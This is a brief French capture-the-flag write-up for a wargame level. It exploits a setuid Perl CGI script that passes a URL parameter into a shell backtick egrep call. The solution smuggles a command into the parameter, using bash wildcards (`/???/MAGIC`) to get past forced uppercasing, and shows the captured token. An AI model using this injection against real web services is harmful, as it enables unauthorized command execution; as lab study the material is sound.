```bash
$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

Le retour du perl, avec le s-bit :)

```bash
$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

le retour du script executable via serveur http sur le port 4646.

```bash
$ curl -i "localhost:4646?x=foo&y=bar"
HTTP/1.1 200 OK
Date: Fri, 13 Sep 2024 20:28:24 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1
Content-Type: text/html

.
```

Bon, le parametre x est mis en majuscules, et ensuite tout ce qui vient apres un whitespace est delete.  
Cela restreint un petit peu les possibilites mais il y a toujours une solution.  
On peut creer un script qui lance getflag et qui met l'output dans un fichier, et le lancer via la faille.  
Pour countourner le probleme des majuscules, on peut utiliser les wildcards de bash.

```bash
$ echo "getflag > /tmp/magic" > /tmp/MAGIC
$ chmod a+x /tmp/MAGIC
$ curl -i 'localhost:4646?x=`/???/MAGIC`'
HTTP/1.1 200 OK
Date: Fri, 13 Sep 2024 20:55:52 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2
Content-Type: text/html

..
$ cat /tmp/magic
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

Le flag est a nous :P